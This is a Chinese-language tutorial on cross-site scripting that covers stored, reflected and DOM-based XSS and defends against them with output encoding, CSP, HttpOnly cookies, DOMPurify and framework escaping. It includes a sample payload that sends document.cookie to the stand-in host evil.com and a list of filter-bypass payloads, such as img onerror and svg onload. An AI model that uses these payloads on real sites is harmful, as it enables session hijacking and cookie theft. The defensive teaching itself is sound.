# XSS 跨站脚本攻击是什么？

## 核心概念

XSS（Cross-Site Scripting，跨站脚本）是攻击者把恶意 JavaScript 注入到网页中，在其他用户的浏览器里执行的攻击。之所以叫“跨站”而不是 CSS，是为了和层叠样式表区分。XSS 的危害不在于“弹个框”，而在于脚本运行后能在用户登录态下做任何事：窃取 Cookie、劫持会话、篡改页面、发起转账请求、植入挖矿脚本等。

XSS 的根本原因是**应用程序把不可信数据插入到 HTML 上下文中却没有正确转义**。浏览器无法区分“页面作者写的脚本”和“攻击者注入的脚本”，只要在 DOM 里看到 `<script>` 就会执行。所以防御的核心不是“过滤输入”，而是“按上下文正确编码输出”——这是很多人混淆的点。

XSS 分三类：**存储型**（恶意脚本存进数据库，每个访问者都中招，危害最大）、**反射型**（脚本在 URL 参数里，服务器原样回显，需要诱导点击）、**DOM 型**（完全不经过服务器，前端 JS 把不可信数据写入 DOM 触发）。

## 标准回答

一句话结论：**XSS 是攻击者把恶意脚本注入网页在其他用户浏览器执行，本质是输出未按上下文转义；分存储型、反射型、DOM 型三种；防护靠输出编码、CSP、HttpOnly Cookie、前端框架自动转义，不要靠输入过滤**。

要点展开：

- **存储型**：脚本存进数据库（如评论、个人简介），访问页面即触发，危害最大。
- **反射型**：脚本在 URL/表单参数里，服务端回显到响应中，需诱导用户点击恶意链接。
- **DOM 型**：服务端无参与，前端 JS 读取 `location.hash` 等不可信来源后写入 `innerHTML` 触发。
- **核心防护**：输出按上下文编码（HTML 实体、JS 转义、URL 编码）、CSP 限制脚本源、Cookie 加 HttpOnly 防窃取、使用 React/Vue 等自动转义的框架。
- **不能依赖的手段**：输入端黑名单过滤（绕过方式无穷）、HTTPS（XSS 在 HTTPS 下同样有效）、WAF（只能挡已知特征）。

## 实现原理

### 三类 XSS 的触发链路

**存储型 XSS 流程**：

```
攻击者 -> 提交评论 <script>fetch('//evil.com?c='+document.cookie)</script>
       -> 写入数据库
       -> 其他用户访问评论页
       -> 服务端取出未转义直接拼到 HTML
       -> 浏览器执行脚本 -> Cookie 发到 evil.com
```

**反射型 XSS 流程**：

```
攻击者构造链接: http://bank.com/search?q=<script>...</script>
诱导受害者点击
-> 服务端把 q 参数值拼到 "搜索结果: q" 返回
-> 浏览器执行脚本
```

**DOM 型 XSS 流程**：

```
页面 JS:
  document.getElementById('x').innerHTML = location.hash.slice(1)
攻击者诱导访问: http://site.com/#<img src=x onerror=alert(1)>
-> 服务端返回的 HTML 不变（看不出来）
-> 前端 JS 把 hash 写入 innerHTML
-> 触发 onerror 执行脚本
```

### 为什么输入过滤治不了 XSS

攻击者输入的“特殊字符”在合法业务里也可能合法（比如用户名带 `<`、评论里贴代码）。黑名单永远绕不完：

```javascript
// 看似严格的过滤，绕过姿势：
<script>alert(1)</script>          // 直接过滤 <script>
<ScRiPt>alert(1)</ScRiPt>          // 大小写绕过
<script >alert(1)</script >        // 加空格
<img src=x onerror=alert(1)>       // 不用 script 标签
<svg/onload=alert(1)>              // svg 事件
javascript:alert(1)                // 协议上下文
<script>                 // Unicode 编码
```

正确的思路是**输出时按上下文编码**：HTML 上下文把 `<` 转 `&lt;`、`>` 转 `&gt;`；JS 字符串上下文用 `<`；URL 上下文用 `encodeURIComponent`。

### CSP 防护原理

Content Security Policy 通过 HTTP 头或 `<meta>` 声明白名单：

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  object-src 'none';
  base-uri 'self';
```

效果：

- 内联 `<script>` 不执行（除非加 nonce 或 hash）
- `eval`、`new Function` 被禁
- 外部脚本只能加载白名单域
- 即使有 XSS 注入点，脚本也跑不起来

注意 CSP 是**纵深防御**，不能替代输出编码——它不能挡 DOM 型 XSS 中通过白名单内 CDN 加载的脚本。

## 代码示例

### Java 后端：按上下文输出编码（OWASP Java Encoder）

```java
import org.owasp.encoder.Encode;

// 1. HTML body 上下文
out.write("<div>" + Encode.forHtml(userComment) + "</div>");

// 2. HTML 属性上下文
out.write("<input value='" + Encode.forHtmlAttribute(userNick) + "'>");

// 3. JavaScript 字符串上下文
out.write("<script>var name = '" + Encode.forJavaScript(userName) + "';</script>");

// 4. URL 参数上下文
out.write("<a href='/search?q=" + Encode.forUriComponent(keyword) + "'>");
```

不要手写正则替换，用 OWASP Encoder 或 Apache Commons Text 的 `StringEscapeUtils`。

### 前端：避免 innerHTML，使用 textContent 或框架

```javascript
// 错误：直接拼 HTML，DOM 型 XSS
document.getElementById('welcome').innerHTML = '欢迎, ' + nameFromUrl;

// 正确：textContent 不解析 HTML
document.getElementById('welcome').textContent = '欢迎, ' + nameFromUrl;

// 必须插 HTML 时，先 sanitize
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userHtml);
```

React 默认转义，只有用 `dangerouslySetInnerHTML` 才会绕过：

```jsx
// 安全：自动转义
<div>{userComment}</div>

// 危险：绕过转义，必须先 sanitize
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userHtml) }} />
```

### Cookie 加 HttpOnly

```java
Cookie sessionCookie = new Cookie("SESSIONID", sessionId);
sessionCookie.setHttpOnly(true);   // JS 读不到，防 XSS 窃取
sessionCookie.setSecure(true);     // 只走 HTTPS
sessionCookie.setPath("/");
response.addCookie(sessionCookie);
```

### Spring Boot 配置 CSP

```java
@Bean
SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(h -> h.contentSecurityPolicy(csp ->
        csp.policyDirectives(
            "default-src 'self'; " +
            "script-src 'self' https://cdn.jsdelivr.net; " +
            "object-src 'none'; " +
            "frame-ancestors 'none'; " +
            "base-uri 'self'"
        )
    ));
    return http.build();
}
```

## 实战场景

| 场景 | 漏洞点 | 防御方式 |
|------|--------|----------|
| 评论/留言板 | 内容存库后未编码回显 | 输出 HTML 编码 + 富文本用白名单 sanitize |
| 搜索结果页 | 关键词直接拼到响应 | 服务端 HTML 编码；URL 参数转义 |
| 个人主页昵称 | 昵称被插入到 `<input value="...">` 或 JS 变量 | 按属性/JS 上下文分别编码 |
| URL hash 路由 | 前端读 hash 写 innerHTML | 改用 textContent 或 DOMPurify |
| 富文本编辑器 | 允许 HTML 但不过滤 | 服务端用 jsoup 白名单清洗标签和属性 |
| 邮件模板渲染 | 用户名插入 HTML 邮件 | 模板引擎开自动转义（Thymeleaf 默认开） |

## 深挖追问

**Q1：HttpOnly Cookie 就能防 XSS 了吗？**

不能。HttpOnly 只让 JS 读不到 Cookie，挡不住脚本在登录态下直接发请求（不需要拿到 Cookie，浏览器自动带）。所以 HttpOnly 是降低危害，不是消除 XSS。完整防护要靠输出编码 + CSP。

**Q2：CSP 报告模式怎么用？**

先上 `Content-Security-Policy-Report-Only` 头，浏览器只上报违规不拦截，收集一段时间确认没误伤再切到强制 CSP。报告地址用 `report-uri` 或新的 `report-to`。

**Q3：富文本场景怎么处理？**

不能简单 HTML 编码（会把 `<b>` 也变成显示文本），需要白名单清洗：用 jsoup 配置 `Whitelist.relaxed()`，只允许 `<b>` `<i>` `<a>` `<p>` 等安全标签和有限属性，去掉 `<script>` `<iframe>` `onload` `javascript:` 等。前端再叠 DOMPurify。

**Q4：React/Vue 是不是天然防 XSS？**

默认防反射型和存储型（自动转义插值），但 DOM 型和 `dangerouslySetInnerHTML` / `v-html` 仍可能中招。还有通过 `href={userInput}` 拼到 `javascript:` 协议的场景也要校验。

**Q5：XSS 和 CSRF 区别？**

XSS 是“在你网站里执行脚本”，CSRF 是“借你登录态发请求”。XSS 防御靠编码和 CSP，CSRF 防御靠 Token 和 SameSite。详见 [XSS 攻击和 CSRF 攻击区别是什么？](XSS攻击和CSRF攻击区别是什么？.md)。

## 易错点

- **只过滤 `<script>`**：绕过方式无穷，必须按上下文编码。
- **服务端编码后存库**：编码应该在输出时做，存原始数据，否则在非 HTML 上下文（JS、URL）展示时会双重编码或漏编码。
- **以为 HTTPS 能防 XSS**：HTTPS 只防传输层窃听篡改，XSS 是应用层注入，HTTPS 下同样有效。
- **以为前端校验就够**：前端校验可被绕过，服务端必须重新校验和编码。
- **`innerHTML` 当模板用**：DOM 型 XSS 的主要入口，改用 `textContent` 或框架插值。
- **`eval(userInput)` / `new Function(userInput)`**：CSP 都挡不住的代码注入，绝对禁止。
- **CSP 上线直接强制**：先 Report-Only 跑一段时间，否则可能白屏。
- **CSP 用 `unsafe-inline`**：等于没设，要么用 nonce/hash，要么彻底禁内联。

## 总结

XSS 是“输出未编码”导致的代码注入，不是“输入未过滤”。三类 XSS 中存储型危害最大、DOM 型最隐蔽。防御优先级：用框架自动转义 > 按上下文手动编码 > CSP 纵深防御 > HttpOnly 降低危害。富文本场景必须用白名单清洗，不能简单编码。CSP 是兜底，不是替代品。

## 参考资料

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN: Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP Java Encoder](https://github.com/OWASP/owasp-java-encoder)
- [DOMPurify](https://github.com/cure53/DOMPurify)

---
